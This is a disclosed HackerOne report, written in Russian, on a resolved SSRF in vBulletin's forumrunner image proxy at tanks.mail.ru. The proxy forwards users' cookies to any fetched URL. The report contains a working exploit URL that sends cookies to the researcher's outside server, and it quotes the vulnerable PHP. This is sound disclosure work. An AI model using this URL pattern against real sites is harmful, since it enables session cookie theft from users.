---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1166943'
original_report_id: '1166943'
title: '[tanks.mail.ru] SSRF + Кража cookie'
weakness: Cross-Site Request Forgery (CSRF)
team_handle: mailru
created_at: '2021-04-16T20:43:14.562Z'
disclosed_at: '2021-07-22T15:07:52.238Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 55
asset_identifier: Ext. B Scope
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# [tanks.mail.ru] SSRF + Кража cookie

## Metadata

- HackerOne Report ID: 1166943
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: mailru
- Disclosed At: 2021-07-22T15:07:52.238Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

###Введение:
>Этим прекрасным вечером решили начать движок форума vBulletin, ведь он стоит на ~7 сайтах которые относятся к Ext.B, а награды Вы там >подняли в 3 раза практически, звучит вкусно :)
>Глаз упал на forumrunner, ведь там была sql-inj(cve 16 года)
>ПРимерно за час была обнаружена SSRF, да не простая SSRF, она отправляет все куки пользователя на сайт, с которого получает изображение, >а  это уже интереснее.

###PoC:
>Эксплотация довольно простая.
```
https://tanks.mail.ru/forum/forumrunner/image.php?url=http://dev.pirateland.ru/h1/stels.php?login=hackerone&password=test2.jpg
```

>На наш сервер приходит следующее:
>███████
_IP-адрес: 178.22.88.47_

###В чём проблема?:
~/forumrunner/image.php
---------------------
### ~ 41 и 43 строка
```php
#~~~~~~
$snoopy = new snoopy();

$snoopy->cookies = $_COOKIE; #Записываем печеньки в поле объекта
#~~~~~~
```

~/forumrunner/support/Snoopy.class.php
---------------------
### ~ 800 строка, в функции `_httprequest`
В данном фрагменте видно, что заданные до этого печеньки отправляются в запросе на указанный URL
```php
if(!empty($this->cookies))
{			
	if(!is_array($this->cookies))
		$this->cookies = (array)$this->cookies;

	reset($this->cookies);
	if ( count($this->cookies) > 0 ) {
		$cookie_headers .= 'Cookie: ';
		foreach ( $this->cookies as $cookieKey => $cookieVal ) {
			if (is_string($cookieVal)) {
				$cookie_headers .= $cookieKey."=".urlencode($cookieVal)."; ";
			}
		}
		$headers .= substr($cookie_headers,0,-2) . "\r\n";
	} 
}
```

PS: Мы решили красиво, внятно и чётко оформлять отчёты :) Надеюсь, что это Вам поможет быстрее решать проблемы, сделаем сервера Mail.Ru безопаснее!)
Ещё прикладываем видео:

█████████

## Impact

SSRF + кража cookie

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
